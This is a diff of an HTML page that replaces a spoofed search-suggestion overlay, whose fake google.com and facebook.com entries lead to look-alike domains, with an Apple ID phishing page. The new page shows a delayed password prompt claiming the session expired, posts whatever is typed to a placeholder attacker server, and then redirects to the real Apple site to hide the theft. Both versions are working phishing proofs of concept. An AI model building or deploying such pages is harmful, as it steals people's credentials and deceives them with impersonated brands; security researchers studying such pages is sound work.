@@ -1,81 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Type to Search</title>
+  <title>Secure Session Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
+    html, body {
       margin: 0;
+      padding: 0;
+      background: #f4f4f4;
+      height: 100%;
       font-family: sans-serif;
-      background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
     }
 
-    input {
-      margin: 50px auto;
-      display: block;
-      width: 400px;
-      padding: 12px;
+    button {
+      padding: 16px 32px;
       font-size: 18px;
-    }
-
-    #spoof-suggestion {
-      position: fixed;
-      top: 96px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 400px;
-      border: 1px solid #ccc;
-      background: #fff;
-      z-index: 9999;
-      font-size: 16px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-      display: none;
-    }
-
-    .item {
-      padding: 8px 12px;
-      border-bottom: 1px solid #eee;
+      background: #007aff;
+      color: white;
+      border: none;
+      border-radius: 8px;
       cursor: pointer;
     }
 
-    .item:hover {
-      background-color: #f1f1f1;
-    }
-
-    .url {
-      color: #060;
-      font-size: 14px;
+    h2 {
+      margin-bottom: 20px;
     }
   </style>
 </head>
 <body>
 
-<input type="text" id="search" placeholder="Type something like 'g' or 'fa'...">
-
-<div id="spoof-suggestion">
-  <div class="item" onclick="location.href='https://goog1e.com'">
-    <div>google.com</div>
-    <div class="url">https://google.com</div>
-  </div>
-  <div class="item" onclick="location.href='https://facelook.com'">
-    <div>facebook.com</div>
-    <div class="url">https://facebook.com</div>
-  </div>
-</div>
+<h2>Tap to Continue</h2>
+<button onclick="start()">Verify Identity</button>
 
 <script>
-const input = document.getElementById('search');
-const overlay = document.getElementById('spoof-suggestion');
-
-input.addEventListener('keydown', (e) => {
+function start() {
+  // Delay prompt after gesture
   setTimeout(() => {
-    const val = input.value.toLowerCase();
-    if (val === 'g' || val === 'fa') {
-      overlay.style.display = 'block';
-    } else {
-      overlay.style.display = 'none';
+    const input = prompt("🔐 Apple ID session expired.\nPlease enter your password to continue:");
+
+    // After prompt, delay again then redirect to legit site
+    setTimeout(() => {
+      location.href = "https://appleid.apple.com"; // trusted domain
+    }, 800);
+
+    // Optional: Send data (if testing exfil PoC)
+    if (input) {
+      fetch("https://your-attacker-server.com/log", {
+        method: "POST",
+        body: JSON.stringify({ password: input }),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      });
     }
-  }, 50); // keyboard race: tampilkan sebelum omnibox suggestion asli
-});
+
+  }, 3000); // Prompt shows after 3s delay (user loses gesture context)
+}
 </script>
 
 </body>
